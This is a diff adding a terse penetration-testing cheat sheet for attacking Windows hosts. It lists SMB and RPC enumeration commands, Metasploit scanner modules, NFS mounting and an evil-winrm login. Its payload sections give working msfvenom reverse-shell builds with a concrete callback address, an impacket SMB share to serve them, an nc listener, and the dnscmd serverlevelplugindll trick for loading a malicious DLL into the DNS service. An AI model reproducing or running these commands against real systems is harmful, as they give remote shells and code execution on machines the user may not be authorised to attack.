@@ -1,0 +1,79 @@
+# This is commands for Windows Clients
+
+
+# This is for standard web commmand methodology
+
+#Vulnerability Scanning
+ ________________
+|bash vuln.sh    |
+|                |
+|bash web-vuln.sh|
+ ----------------
+
+# ENUMERATION___________________________________________
+|smbclient -L \\\\<IP address>\\
+|smbpasswd -r <target> -U <user>
+
+enum4linux <IP address>
+
+msfconsole
+	auxiliary/scanner/smb/smb_enumshares 
+	auxiliary/scanner/smb/smb_enumusers    
+	auxiliary/scanner/smb/smb_enumusers_domain
+	auxiliary/scanner/smb/smb_login
+|rpc
+|--rpcclient -U <WORKGROUP>\\<USER> <IP ADDRESS>
+|----|enter passwd:
+|------|rpcclient $>
+|--------|enumdomusers
+|--------|enumprivs
+|--------|enumprinters
+|________|
+
+#[rpcbind is present]
+|
+|rpcinfo -r <Target IP>
+|
+|--if "mountd" is present
+|  |
+|  --showmount --exports
+|    |
+|    --if mount is present
+|      |
+|      --mkdir /tmp/mount_folder
+|      |
+|      --mount --types nfs <IP address>:/<rpc-folder> /tmp/mounted_folder
+
+#Exploit Dev_____________________________________________________
+
+|evil-winrm -u <username> -p '<password>' -i <IP address>
+
+#XSS
+
+#SQLI
+
+
+#Enumeration______________________________________________________
+
+dir -force = ls -a
+
+#Payload Dev___________________________________________
+# FOR SERVICE INJECTS___________________________________
+
+|_______________________________________________
+|msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.144 LPORT=4444 --platform=windows -f dll > /home/d43d3lu5/shell-scripts/payloads/oco.dll
+|cd /usr/share/doc/python3-impacket/examples
+|sudo python3 smbserver.py -smb2support oco /home/d43d3lu5/shell-scripts/payloads
+|nc -nvlp 4444
+|
+|On infected windows device
+|dnscmd.exe /config /serverlevelplugindll \\<LHOST>\oco\oco.dll
+|sc.exe stop dns
+|sc.exe start dns
+______________________________________________
+#Payload Dropping______________________________
+-----------------------------------------------
+|msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=<local IP> LPORT=4444 --platform=windows -f exe > EXPLOIT
+|
+|python exploit.py -u <username> -p <password> -i <target IP> -c powershell.exe -a "ls C:<dir path>"
+----------------------------------------------
